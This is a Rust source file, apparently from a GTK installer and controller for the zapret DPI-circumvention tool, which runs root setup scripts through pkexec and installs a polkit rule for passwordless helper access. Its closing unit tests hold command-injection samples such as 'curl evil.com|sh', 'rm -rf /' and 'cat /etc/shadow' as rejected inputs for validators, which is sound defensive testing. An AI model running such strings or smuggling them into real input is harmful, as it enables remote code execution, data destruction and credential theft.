                root_commands.push_str("service NetworkManager restart || true\n");
                root_commands.push_str("update-rc.d dnscrypt-proxy defaults || chkconfig --add dnscrypt-proxy\n");
                root_commands.push_str("service dnscrypt-proxy start\n");
            }
            else if init == "dinit" {
                root_commands.push_str("dinitctl restart NetworkManager || true\n");
                root_commands.push_str("dinitctl enable dnscrypt-proxy || true\n");
                root_commands.push_str("dinitctl start dnscrypt-proxy || true\n");
            }
            else {
                root_commands.push_str("systemctl restart NetworkManager\n");
                root_commands.push_str("systemctl enable dnscrypt-proxy.service\n");
                root_commands.push_str("systemctl start dnscrypt-proxy.service\n");
            }
        }
        root_commands.push_str("if [ ! -d /opt/zapret ] || [ ! -f /opt/zapret/blockcheck.sh ]; then\n");
        root_commands.push_str("  echo \"STATUS:DOWNLOADING_ZAPRET\"\n");
        root_commands.push_str("  rm -rf /opt/zapret 2>/dev/null || true\n");
        root_commands.push_str("  git clone --depth=1 https://github.com/bol-van/zapret.git /opt/zapret\n");
        root_commands.push_str("  git config --global --add safe.directory /opt/zapret || true\n");
        root_commands.push_str("  echo \"STATUS:BUILDING_ZAPRET\"\n");
        root_commands.push_str("  make -C /opt/zapret\n");
        root_commands.push_str("  chown -R root:root /opt/zapret\n");
        root_commands.push_str("  chmod -R 755 /opt/zapret\n");
        root_commands.push_str("fi\n");
        root_commands.push_str("echo \"STATUS:POLKIT_SETUP\"\n");
        root_commands.push_str(get_polkit_setup_script());
        if cancel_flag_thread.load(Ordering::Relaxed) { return; }
        {
            let _ = sender.send(AppMsg::Status(t("Yetki onayı bekleniyor...")));
            let script_path = get_secure_runtime_dir().join("zapret_installer_job.sh");
            #[cfg(unix)]
            {
                use std::fs::OpenOptions;
                use std::os::unix::fs::OpenOptionsExt;
                let _ = fs::remove_file(&script_path);
                if let Ok(mut file) = OpenOptions::new()
                    .write(true)
                    .create(true)
                    .truncate(true)
                    .mode(0o700)
                    .open(&script_path)
                {
                    let _ = file.write_all(root_commands.as_bytes());
                }
            }
            println!("--- Installer Script Content ---\n{}\n--------------------------------", root_commands);
            log_to_file(&format!("--- Installer Script Content ---\n{}\n--------------------------------", root_commands));
            let mut child = Command::new("pkexec")
                .arg("/bin/sh")
                .arg(&script_path)
                .stdout(Stdio::piped())
                .spawn()
                .expect("pkexec başlatılamadı");
            let _ = sender.send(AppMsg::PID(child.id()));
            let mut last_error_line = String::new();
            if let Some(stdout) = child.stdout.take() {
                let reader = BufReader::new(stdout);
                for line in reader.lines() {
                    if cancel_flag_thread.load(Ordering::Relaxed) {
                        let _ = Command::new("pkexec")
                            .arg(get_zapret_control_path())
                            .arg("kill-pid")
                            .arg(child.id().to_string())
                            .output();
                        let _ = child.kill();
                        let _ = child.wait();
                        let _ = fs::remove_file(&script_path);
                        return;
                    }
                    if let Ok(l) = line {
                        println!("[Installer]: {}", l);
                        log_to_file(&format!("[Installer]: {}", l));
                        if !l.starts_with("STATUS:") {
                             last_error_line = l.clone();
                        }
                        if l.contains("STATUS:CLEANING") {
                            let _ = sender.send(AppMsg::Status(t("Eski dosyalar temizleniyor...")));
                        } else if l.contains("STATUS:INSTALLING_DEPS") {
                            let _ = sender.send(AppMsg::Status(t("Eksik paketler kuruluyor...")));
                        } else if l.contains("STATUS:INSTALLING") {
                            let _ = sender.send(AppMsg::Status(t("DNSCrypt-proxy kuruluyor...")));
                        } else if l.contains("STATUS:CONFIGURING") {
                            let _ = sender.send(AppMsg::Status(t("DNS ayarları yapılıyor...")));
                        } else if l.contains("STATUS:SETTING_DNS") {
                            let _ = sender.send(AppMsg::Status(t("Cloudflare DNS ayarlanıyor...")));
                        } else if l.contains("STATUS:DOWNLOADING_ZAPRET") {
                            let _ = sender.send(AppMsg::Status(t("Zapret deposu indiriliyor...")));
                        } else if l.contains("STATUS:BUILDING_ZAPRET") {
                            let _ = sender.send(AppMsg::Status(t("Zapret derleniyor (make)...")));
                        } else if l.contains("STATUS:FINALIZING") {
                            let _ = sender.send(AppMsg::Status(t("Ağ ayarları ve servisler başlatılıyor...")));
                        }
                    }
                }
            }
            if cancel_flag_thread.load(Ordering::Relaxed) {
                let _ = Command::new("pkexec")
                    .arg(get_zapret_control_path())
                    .arg("kill-pid")
                    .arg(child.id().to_string())
                    .output();
                let _ = child.kill();
                let _ = child.wait();
                let _ = fs::remove_file(&script_path);
                return; 
            }
            let status = child.wait();
            match status {
                Ok(s) if s.success() => {
                    let _ = sender.send(AppMsg::Status(t("Tamamlanıyor...")));
                    let _ = fs::remove_file(script_path);
                    thread::sleep(Duration::from_millis(500));
                    let _ = sender.send(AppMsg::Done(Ok(())));
                },
                Ok(s) => {
                    let error_msg = if !last_error_line.is_empty() {
                         t("İşlem başarısız (Kod: {c}). Son çıktı: {e}")
                            .replace("{c}", &s.code().unwrap_or(-1).to_string())
                            .replace("{e}", &last_error_line)
                    } else {
                         t("İşlem başarısız (Kod: {}). Yetki verilmedi veya bilinmeyen hata.").replace("{}", &s.code().unwrap_or(-1).to_string())
                    };
                    let _ = sender.send(AppMsg::Done(Err(io::Error::new(io::ErrorKind::PermissionDenied, error_msg))));
                    return;
                },
                Err(e) => {
                    let _ = sender.send(AppMsg::Done(Err(e)));
                    return;
                }
            }
        }
    });
    glib::timeout_add_local(Duration::from_millis(100), move || {
        pb.pulse();
        if !is_installing_flag.get() {
             return glib::ControlFlow::Break;
        }
        match receiver.try_recv() {
            Ok(msg) => {
                if cancel_flag_ui.load(Ordering::Relaxed) {
                    return glib::ControlFlow::Break;
                }
                match msg {
                    AppMsg::PID(pid) => {
                        if let Ok(mut guard) = pid_store.lock() {
                            *guard = Some(pid);
                        }
                        glib::ControlFlow::Continue
                    },
                    AppMsg::Status(text) => {
                        lbl.set_label(&text);
                        glib::ControlFlow::Continue
                    },
                    AppMsg::Done(result) => {
                        pb.set_visible(false);
                        btn.set_sensitive(true);
                        is_installing_flag.set(false);
                        if let Ok(mut guard) = pid_store.lock() {
                            *guard = None;
                        }
                        match result {
                            Ok(_) => {
                                log_to_file("Installation process completed successfully.");
                                btn.set_label(&t("Devam"));
                                btn.remove_css_class("destructive-action");
                                btn.add_css_class("success");
                                lbl.set_label(&t("Kurulum bitti. Devam edebilirsiniz."));
                                is_complete_flag.set(true);
                            },
                            Err(e) => {
                                log_to_file(&format!("Installation failed: {}", e));
                                btn.set_label(&t("Tekrar Dene"));
                                btn.remove_css_class("destructive-action");
                                btn.add_css_class("warning");
                                lbl.set_label(&t("Hata: {}").replace("{}", &e.to_string()));
                            }
                        }
                        glib::ControlFlow::Break
                    }
                }
            },
            Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
            Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
        }
    });
}
fn ensure_polkit_rules_installed() {
    let control_file = Path::new("/usr/bin/zapret-control");
    let rule_file = Path::new("/run/polkit-1/rules.d/90-zapret-gtk.rules");
    let control_content = fs::read_to_string(control_file).unwrap_or_default();
    if control_file.exists() && control_content.contains("# VERSION: 8") && control_content.contains("apply-strategy") && rule_file.exists() {
        return;
    }
    if !Path::new("/opt/zapret").exists() {
        return;
    }
    log_to_file("Ephemeral Polkit rule not active. Initializing runtime authorization on startup...");
    let script = get_polkit_setup_script();
    let temp_script = get_secure_runtime_dir().join("zapret_polkit_init.sh");
    #[cfg(unix)]
    {
        use std::fs::OpenOptions;
        use std::os::unix::fs::OpenOptionsExt;
        let _ = fs::remove_file(&temp_script);
        if let Ok(mut f) = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(0o700)
            .open(&temp_script)
        {
            let _ = f.write_all(format!("#!/bin/sh\nset -e\n{}\nrm -f \"{}\"\n", script, temp_script.display()).as_bytes());
            let _ = Command::new("pkexec")
                .arg("/bin/sh")
                .arg(&temp_script)
                .output();
        }
    }
}

fn get_polkit_setup_script() -> &'static str {
    r#"mkdir -p /opt/zapret /run/polkit-1/rules.d /etc/polkit-1/rules.d /usr/bin 2>/dev/null || true
rm -f /etc/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
cat << 'EOF' > /usr/bin/zapret-control
#!/bin/sh
# VERSION: 8
set -e
export LC_ALL=C

restart_service() {
    systemctl restart zapret 2>/dev/null || rc-service zapret restart 2>/dev/null || sv restart zapret 2>/dev/null || service zapret restart 2>/dev/null || dinitctl restart zapret 2>/dev/null || true
}

stop_service() {
    systemctl stop zapret 2>/dev/null || rc-service zapret stop 2>/dev/null || sv down zapret 2>/dev/null || service zapret stop 2>/dev/null || dinitctl stop zapret 2>/dev/null || killall -9 nfqws tpws dvtws 2>/dev/null || pkill -9 -x nfqws 2>/dev/null || pkill -9 -x tpws 2>/dev/null || true
}

start_service() {
    systemctl start zapret 2>/dev/null || rc-service zapret start 2>/dev/null || sv up zapret 2>/dev/null || service zapret start 2>/dev/null || dinitctl start zapret 2>/dev/null || true
}

is_zapret_proc() {
    _p="$1"
    [ -d "/proc/$_p" ] || return 1
    _c=$(cat "/proc/$_p/comm" 2>/dev/null || true)
    case "$_c" in
        nfqws|tpws|dvtws|mdig|ip2net) return 0 ;;
    esac
    _cmd=$(tr '\0' ' ' < "/proc/$_p/cmdline" 2>/dev/null || true)
    case "$_cmd" in
        *"/opt/zapret/blockcheck.sh"*|*"/opt/zapret/install_easy.sh"*|*"zapret_installer_job.sh"*|*"/usr/bin/zapret-control"*) return 0 ;;
        *) return 1 ;;
    esac
}

kill_proc_tree() {
    _parent="$1"
    [ -z "$_parent" ] && return
    for _child in $(pgrep -P "$_parent" 2>/dev/null); do
        kill_proc_tree "$_child"
    done
    if is_zapret_proc "$_parent"; then
        kill -9 "$_parent" 2>/dev/null || true
    fi
}

case "$1" in
    start)
        start_service
        ;;
    stop)
        stop_service
        ;;
    restart)
        restart_service
        ;;
    cat-config)
        if [ -f /opt/zapret/config ]; then
            cat /opt/zapret/config
        fi
        ;;
    apply-strategy)
        # Reads single strategy string from stdin
        read -r raw_strat
        # Whitelist: alphanumeric, -, _, =, +, :, ,, ., /, <, >, space
        if echo "$raw_strat" | grep -q '[^a-zA-Z0-9_\-=+:,.<>/ ]'; then
            echo "Security Error: Prohibited characters in strategy string." >&2
            exit 1
        fi
        if [ -f /opt/zapret/config ]; then
            sed -i "s|^NFQWS_OPT=.*|NFQWS_OPT=\"$raw_strat\"|" /opt/zapret/config
        fi
        restart_service
        ;;
    apply-hostlist)
        # Mode argument: "none" or "hostlist"
        mode="$2"
        case "$mode" in
            none|hostlist) ;;
            *) echo "Security Error: Invalid filter mode." >&2; exit 1 ;;
        esac

        mkdir -p /opt/zapret/ipset
        tmp_target="/opt/zapret/ipset/zapret-hosts-user.txt.tmp"
        final_target="/opt/zapret/ipset/zapret-hosts-user.txt"

        cat > "$tmp_target"
        mv -f "$tmp_target" "$final_target"
        chmod 644 "$final_target"
        chown root:root "$final_target" 2>/dev/null || true

        if [ -f /opt/zapret/config ]; then
            sed -i "s|^MODE_FILTER=.*|MODE_FILTER=$mode|" /opt/zapret/config
        fi
        restart_service
        ;;
    blockcheck)
        shift
        repeats="$1"
        scan_level="$2"
        shift 2
        domains="$*"
        if [ -f /opt/zapret/blockcheck.sh ]; then
            if ! echo "$repeats" | grep -Eq '^[0-9]+$'; then repeats=1; fi
            case "$scan_level" in
                quick|standard|force) ;;
                *) scan_level="standard" ;;
            esac
            cd /opt/zapret
            BATCH=1 REPEATS="$repeats" SCANLEVEL="$scan_level" SKIP_TPWS=1 ENABLE_HTTP=1 ENABLE_HTTPS_TLS12=1 ENABLE_HTTPS_TLS13=1 ZAPRET_BASE="/opt/zapret" DOMAINS="$domains" /bin/sh /opt/zapret/blockcheck.sh
        fi
        ;;
    easy-install)
        if [ -f /opt/zapret/install_easy.sh ]; then
            export ZAPRET_BASE="/opt/zapret"
            cd /opt/zapret
            printf "Y\nY\nN\n1\nN\nN\nY\nN\n\n\n" | /bin/sh /opt/zapret/install_easy.sh
            sed -i 's/^NFQWS_ENABLE=.*/NFQWS_ENABLE=1/' /opt/zapret/config 2>/dev/null || true
            rm -f /opt/zapret/zapret-control.sh 2>/dev/null || true
            restart_service
        fi
        ;;
    kill-pid)
        target_pid="$2"
        if [ -n "$target_pid" ] && echo "$target_pid" | grep -Eq '^[0-9]+$'; then
            kill_proc_tree "$target_pid"
        fi
        for p in $(pgrep -f '/opt/zapret/blockcheck.sh' 2>/dev/null); do
            kill -9 "$p" 2>/dev/null || true
        done
        for p in $(pgrep -f '/opt/zapret/install_easy.sh' 2>/dev/null); do
            kill -9 "$p" 2>/dev/null || true
        done
        for p in $(pgrep -f 'zapret_installer_job.sh' 2>/dev/null); do
            kill -9 "$p" 2>/dev/null || true
        done
        pkill -9 -x nfqws 2>/dev/null || true
        pkill -9 -x tpws 2>/dev/null || true
        pkill -9 -x dvtws 2>/dev/null || true
        pkill -9 -x mdig 2>/dev/null || true
        pkill -9 -x ip2net 2>/dev/null || true
        ;;
    cleanup-session)
        target_pid="$2"
        if [ -n "$target_pid" ] && echo "$target_pid" | grep -Eq '^[0-9]+$'; then
            kill_proc_tree "$target_pid"
        fi
        for p in $(pgrep -f '/opt/zapret/blockcheck.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
        for p in $(pgrep -f '/opt/zapret/install_easy.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
        for p in $(pgrep -f 'zapret_installer_job.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
        pkill -9 -x nfqws 2>/dev/null || true
        pkill -9 -x tpws 2>/dev/null || true
        pkill -9 -x dvtws 2>/dev/null || true
        pkill -9 -x mdig 2>/dev/null || true
        pkill -9 -x ip2net 2>/dev/null || true
        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
        ;;
    clean-session)
        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
        ;;
    update)
        cd /opt/zapret
        git fetch origin
        git reset --hard origin/master
        make -B
        [ -f /opt/zapret/install_bin.sh ] && sh /opt/zapret/install_bin.sh || true
        restart_service
        ;;
    uninstall)
        stop_service
        systemctl disable zapret 2>/dev/null || true
        systemctl disable zapret-list-update.timer 2>/dev/null || true
        rc-update del zapret default 2>/dev/null || true
        rm -rf /etc/runit/runsvdir/default/zapret /var/service/zapret /etc/service/zapret /run/runit/service/zapret 2>/dev/null || true
        if command -v update-rc.d >/dev/null 2>&1; then update-rc.d -f zapret remove 2>/dev/null || true; elif command -v chkconfig >/dev/null 2>&1; then chkconfig --del zapret 2>/dev/null || true; fi
        dinitctl disable zapret 2>/dev/null || true
        rm -f /etc/systemd/system/zapret* /usr/lib/systemd/system/zapret* 2>/dev/null || true
        rm -f /etc/init.d/zapret /etc/rc.d/zapret /etc/dinit.d/zapret /etc/dinit.d/boot.d/zapret /etc/sv/zapret 2>/dev/null || true
        systemctl daemon-reload 2>/dev/null || true
        rm -rf /opt/zapret
        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla /usr/bin/zapret-control /opt/zapret/zapret-control.sh 2>/dev/null || true
        exit 0
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|cat-config|apply-strategy|apply-hostlist <mode>|blockcheck <repeats> <level> [domains]|easy-install|kill-pid <pid>|cleanup-session <pid>|clean-session|update|uninstall}"
        exit 1
        ;;
esac
EOF
chmod 755 /usr/bin/zapret-control 2>/dev/null || true
rm -f /opt/zapret/zapret-control.sh 2>/dev/null || true

CURRENT_USER=""
if [ -n "$PKEXEC_UID" ]; then
    CURRENT_USER=$(getent passwd "$PKEXEC_UID" | cut -d: -f1)
fi
if [ -z "$CURRENT_USER" ] && [ -n "$SUDO_USER" ]; then
    CURRENT_USER="$SUDO_USER"
fi
if [ -z "$CURRENT_USER" ]; then
    CURRENT_USER=$(logname 2>/dev/null || true)
fi

if [ -n "$CURRENT_USER" ] && [ "$CURRENT_USER" != "root" ] && echo "$CURRENT_USER" | grep -Eq '^[a-zA-Z0-9_.][a-zA-Z0-9_.-]*$'; then
mkdir -p /run/polkit-1/rules.d 2>/dev/null || true
cat << EOF > /run/polkit-1/rules.d/90-zapret-gtk.rules
/* Zapret-GTK Ephemeral Runtime Rule */
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        var prog = action.lookup("program");
        if (prog && prog == "/usr/bin/zapret-control" && subject.user == "$CURRENT_USER") {
            return polkit.Result.YES;
        }
    }
});
EOF
chmod 644 /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
rm -f /etc/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla 2>/dev/null || true
fi

if [ -n "$PKEXEC_UID" ]; then
    U_HOME=$(getent passwd "$PKEXEC_UID" | cut -d: -f6)
    U_NAME=$(getent passwd "$PKEXEC_UID" | cut -d: -f1)
    if [ -n "$U_HOME" ] && [ -d "$U_HOME/.config/zapret-gtk" ]; then
        chown -R "$U_NAME:$U_NAME" "$U_HOME/.config/zapret-gtk" 2>/dev/null || true
        chmod 700 "$U_HOME/.config/zapret-gtk" 2>/dev/null || true
        chmod 600 "$U_HOME/.config/zapret-gtk"/* 2>/dev/null || true
    fi
fi
"#
}

fn get_zapret_remote_commit_hash() -> Option<String> {
    let remote_out = Command::new("git")
        .args(["ls-remote", "https://github.com/bol-van/zapret.git", "HEAD"])
        .output()
        .ok()?;
    if !remote_out.status.success() {
        return None;
    }
    let remote_str = String::from_utf8_lossy(&remote_out.stdout);
    let remote_hash = remote_str.split_whitespace().next()?.trim().to_string();
    if remote_hash.is_empty() {
        None
    } else {
        Some(remote_hash)
    }
}

fn check_zapret_update_available() -> Option<bool> {
    let zapret_dir = Path::new("/opt/zapret");
    if !zapret_dir.exists() {
        return None;
    }
    let local_out = Command::new("git")
        .args(["-c", "safe.directory=/opt/zapret", "-C", "/opt/zapret", "rev-parse", "HEAD"])
        .output()
        .ok()?;
    if !local_out.status.success() {
        return None;
    }
    let local_hash = String::from_utf8_lossy(&local_out.stdout).trim().to_string();
    if local_hash.is_empty() {
        return None;
    }

    let remote_hash = get_zapret_remote_commit_hash()?;
    Some(local_hash != remote_hash)
}

fn get_init_system() -> String {
    if Path::new("/run/systemd/system").exists() {
        return "systemd".to_string();
    }
    if Path::new("/run/openrc").exists() || (Path::new("/sbin/openrc-run").exists() && Path::new("/run/openrc").exists()) {
        return "openrc".to_string();
    }
    if Path::new("/run/runit").exists() || Path::new("/etc/runit").exists() {
        return "runit".to_string();
    }
    if Path::new("/sbin/dinit").exists() || Path::new("/etc/dinit.d").exists() {
        return "dinit".to_string();
    }
    if Path::new("/etc/init.d").exists() && !Path::new("/run/systemd/system").exists() {
        return "sysvinit".to_string();
    }
    if Command::new("systemctl").arg("--version").output().is_ok() {
        return "systemd".to_string();
    }
    if Command::new("rc-status").output().is_ok() {
        return "openrc".to_string();
    }
    if Command::new("sv").output().is_ok() {
        return "runit".to_string();
    }
    if Command::new("dinitctl").arg("--help").output().is_ok() {
        return "dinit".to_string();
    }
    if Command::new("service").arg("--version").output().is_ok() {
        return "sysvinit".to_string();
    }
    "unknown".to_string()
}
fn get_distro_id() -> String {
    if let Ok(content) = fs::read_to_string("/etc/os-release") {
        for line in content.lines() {
            if line.starts_with("ID=") {
                return line.replace("ID=", "").replace("\"", "").trim().to_lowercase();
            }
        }
    }
    "unknown".to_string()
}
fn get_distro_package_name(distro: &str, package: &str) -> String {
    let mut p = package.to_string();
    if package == "gcc" {
        match distro {
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => p = "build-essential".to_string(),
            "alpine" => p = "build-base".to_string(),
            _ => p = "gcc".to_string(),
        }
    } else if package == "zlib" {
        match distro {
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => p = "zlib1g-dev".to_string(),
            "fedora" | "nobara" => p = "zlib-devel".to_string(),
            "alpine" => p = "zlib-dev".to_string(),
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => p = "zlib".to_string(),
            "gentoo" => p = "sys-libs/zlib".to_string(),
            "void" => p = "zlib-devel".to_string(),
            _ => p = "zlib-devel".to_string(),
        }
    } else if package == "libnetfilter_queue" {
        match distro {
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => p = "libnetfilter-queue-dev libnfnetlink-dev".to_string(),
            "fedora" | "nobara" => p = "libnetfilter_queue-devel libnfnetlink-devel".to_string(),
            "alpine" => p = "libnetfilter_queue-dev libnfnetlink-dev".to_string(),
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => p = "libnetfilter_queue libnfnetlink".to_string(),
            "gentoo" => p = "net-libs/libnetfilter_queue net-libs/libnfnetlink".to_string(),
            "void" => p = "libnetfilter_queue-devel libnfnetlink-devel".to_string(),
            _ => p = "libnetfilter_queue-devel".to_string(),
        }
    } else if package == "libmnl" {
        match distro {
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => p = "libmnl-dev".to_string(),
            "fedora" | "nobara" => p = "libmnl-devel".to_string(),
            "alpine" => p = "libmnl-dev".to_string(),
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => p = "libmnl".to_string(),
            "gentoo" => p = "net-libs/libmnl".to_string(),
            "void" => p = "libmnl-devel".to_string(),
            _ => p = "libmnl-devel".to_string(),
        }
    } else if package == "libcap" {
        match distro {
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => p = "libcap-dev".to_string(),
            "fedora" | "nobara" => p = "libcap-devel".to_string(),
            "alpine" => p = "libcap-dev".to_string(),
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => p = "libcap".to_string(),
            "gentoo" => p = "sys-libs/libcap".to_string(),
            "void" => p = "libcap-devel".to_string(),
            _ => p = "libcap-devel".to_string(),
        }
    } else if package == "dig" {
        match distro {
            "void" | "fedora" | "nobara" => p = "bind-utils".to_string(),
            "alpine" => p = "bind-tools".to_string(),
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => p = "bind".to_string(),
            "gentoo" => p = "net-dns/bind-tools".to_string(),
            _ => p = "dnsutils".to_string(),
        }
    }
    p
}
fn is_package_installed(distro: &str, package_name: &str) -> bool {
    let packages: Vec<&str> = package_name.split_whitespace().collect();
    if packages.is_empty() { return true; }
    for pkg in packages {
        let status = match distro {
            "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => {
                Command::new("pacman").arg("-Qi").arg(pkg).output()
            },
            "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => {
                Command::new("dpkg").arg("-s").arg(pkg).output()
            },
            "fedora" | "nobara" | "opensuse" | "opensuse-tumbleweed" | "opensuse-leap" | "suse" => {
                 Command::new("rpm").arg("-q").arg(pkg).output()
            },
            "alpine" => {
                Command::new("apk").arg("info").arg("-e").arg(pkg).output()
            },
            "void" => {
                Command::new("xbps-query").arg("-p").arg("state").arg(pkg).output()
            },
            "gentoo" => {
                Command::new("qlist").arg("-I").arg(pkg).output()
            },
             _ => return false,
        };
        match status {
            Ok(output) => {
                if !output.status.success() {
                    return false;
                }
            },
            Err(_) => return false,
        }
    }
    true
}
fn get_package_install_command(distro: &str, package: &str) -> Vec<String> {
    let p = get_distro_package_name(distro, package);
    match distro {
        "arch" | "manjaro" | "endeavouros" | "cachyos" | "artix" | "garuda" | "omarchy" => vec!["pacman".to_string(), "-S".to_string(), "--noconfirm".to_string(), "--needed".to_string(), p],
        "fedora" | "nobara" => vec!["dnf".to_string(), "install".to_string(), "-y".to_string(), p],
        "opensuse" | "opensuse-tumbleweed" | "opensuse-leap" | "suse" => vec!["zypper".to_string(), "--non-interactive".to_string(), "in".to_string(), p],
        "alpine" => vec!["apk".to_string(), "add".to_string(), p],
        "void" => vec!["xbps-install".to_string(), "-S".to_string(), "-y".to_string(), p],
        "gentoo" => vec!["emerge".to_string(), p],
        "ubuntu" | "debian" | "linuxmint" | "pop" | "zorin" | "elementary" | "mx" | "neon" | "kubuntu" | "xubuntu" | "lubuntu" | "ubuntu-budgie" | "ubuntukylin" | "ubuntu-mate" | "ubuntucinnamon" | "ubuntu-unity" | "ubuntustudio" | "deepin" | "antix" => vec!["apt-get".to_string(), "install".to_string(), "-y".to_string(), p],
        _ => vec![],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_safe_strategy_param() {
        assert!(is_safe_strategy_param("--filter-tcp=80 --dpi-desync=fake,multisplit --dpi-desync-split-pos=method+2 --dpi-desync-fooling=md5sig"));
        assert!(is_safe_strategy_param("--filter-tcp=443 --dpi-desync=fake <HOSTLIST>"));
        assert!(is_safe_strategy_param("--dpi-desync=split2 --dpi-desync-split-pos=1"));
        assert!(is_safe_strategy_param("--filter-tcp=80/24 --dpi-desync=fake"));
        assert!(is_safe_strategy_param("--filter-tcp=80 --ipset=/opt/zapret/ipset/zapret-hosts-user.txt --dpi-desync=fake"));

        assert!(!is_safe_strategy_param("--dpi-desync=fake\" ; curl evil.com|sh #"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake; rm -rf /"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake && whoami"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake | cat /etc/shadow"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake `whoami`"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake $(id)"));
        assert!(!is_safe_strategy_param("--dpi-desync=fake\n--dpi-desync=bad"));
        assert!(!is_safe_strategy_param("invalid-no-leading-dashes"));
        assert!(!is_safe_strategy_param(""));
    }

    #[test]
    fn test_is_valid_domain() {
        assert!(is_valid_domain("google.com"));
        assert!(is_valid_domain("discord.com"));
        assert!(is_valid_domain("sub.domain.org"));
        assert!(is_valid_domain("test-site.co.uk"));
        assert!(is_valid_domain("discord.gg"));
        assert!(is_valid_domain("youtube.com"));
        assert!(is_valid_domain("sub_domain.com"));
        assert!(is_valid_domain("_dmarc.example.com"));
        assert!(is_valid_domain("a.com"));
        assert!(is_valid_domain("x"));

        assert!(!is_valid_domain(""));
        assert!(!is_valid_domain("http://google.com"));
        assert!(!is_valid_domain("https://google.com"));
        assert!(!is_valid_domain("www.google.com"));
    }

    #[test]
    fn test_parse_strategies_strict() {
        let valid_json_objs = r#"[
            {"strategy": "--filter-tcp=80 --dpi-desync=fake", "active": true},
            {"strategy": "--filter-tcp=443 --dpi-desync=split2", "active": false}
        ]"#;
        let res = parse_strategies_strict(valid_json_objs);
        assert!(res.is_ok());
        let strats = res.unwrap();
        assert_eq!(strats.len(), 2);
        assert_eq!(strats[0].strategy, "--filter-tcp=80 --dpi-desync=fake");
        assert_eq!(strats[1].strategy, "--filter-tcp=443 --dpi-desync=split2");

        let valid_json_strings = r#"["--filter-tcp=80 --dpi-desync=fake", "--filter-tcp=443 --dpi-desync=split2"]"#;
        let res_str = parse_strategies_strict(valid_json_strings);
        assert!(res_str.is_ok());
        assert_eq!(res_str.unwrap().len(), 2);

        let dangerous_json_objs = r#"[
            {"strategy": "--filter-tcp=80 --dpi-desync=fake", "active": true},
            {"strategy": "--dpi-desync=fake\" ; rm -rf / #", "active": true}
        ]"#;
        let dangerous_res = parse_strategies_strict(dangerous_json_objs);
        assert!(dangerous_res.is_err());

        let dangerous_json_strings = r#"["--filter-tcp=80 --dpi-desync=fake", "--dpi-desync=fake && whoami"]"#;
        let dangerous_str_res = parse_strategies_strict(dangerous_json_strings);
        assert!(dangerous_str_res.is_err());

        assert!(parse_strategies_strict("invalid json").is_err());
        assert!(parse_strategies_strict("[]").is_err());
    }
}


